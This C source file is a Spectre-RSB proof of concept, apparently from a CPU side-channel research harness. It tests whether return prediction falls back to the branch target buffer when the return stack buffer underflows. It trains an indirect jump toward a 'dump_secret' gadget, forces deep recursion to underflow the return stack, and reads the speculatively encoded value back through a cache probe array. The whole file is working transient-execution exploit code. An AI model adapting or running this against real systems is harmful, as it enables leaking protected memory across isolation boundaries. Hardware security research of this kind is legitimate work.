#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"

// BTB fallback: tests if ret falls back to BTB when RSB underflows

uint8_t* probe_array;

#define TRAIN_VALUE 0x01

volatile uint8_t current_encode_value;
volatile int recurse_depth;

void __attribute__((noinline)) dump_secret(void) {
    SPEC_FENCE();
    maccess(probe_array + current_encode_value * PAGE_SIZE);
}

typedef void (*target_t)(void);
target_t train_target;

extern void train_jalr(void);
extern void btb_recurse(void);
extern void train_jalr_site(void);
extern void btb_recurse_ret(void);

void btb_fallback_setup(exploit_ctx_t* ctx, void* data) {
    size_t jalr_addr = (size_t)train_jalr_site;
    size_t ret_addr = (size_t)btb_recurse_ret;
    printf("train_jalr_site: 0x%lx (offset 0x%lx)\n", jalr_addr, jalr_addr % 0x8000);
    printf("btb_recurse_ret: 0x%lx (offset 0x%lx)\n", ret_addr, ret_addr % 0x8000);
    printf("Offsets match: %s\n", (jalr_addr % 0x8000) == (ret_addr % 0x8000) ? "YES" : "NO");

    train_target = dump_secret;

    ctx->exclude_enabled = true;
    ctx->exclude_value = TRAIN_VALUE;
}

void btb_fallback_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    for (int m = 0; m < 100; m++) {
        current_encode_value = TRAIN_VALUE;
        for (int i = 0; i < 10; i++) {
            train_jalr();
        }

        current_encode_value = encode_index;
        mfence();
        recurse_depth = 32;
        btb_recurse();
    }
}

int main() {
    exploit_ctx_t ctx = {0};

    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

    printf("Spectre-RSB BTB fallback\n");

    exploit_hooks_t hooks = {
        .setup   = btb_fallback_setup,
        .attack  = btb_fallback_attack,
        .cleanup = NULL
    };

    exploit_run(&ctx, &hooks, NULL);
    exploit_print_results("RSB-to-BTB fallback", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
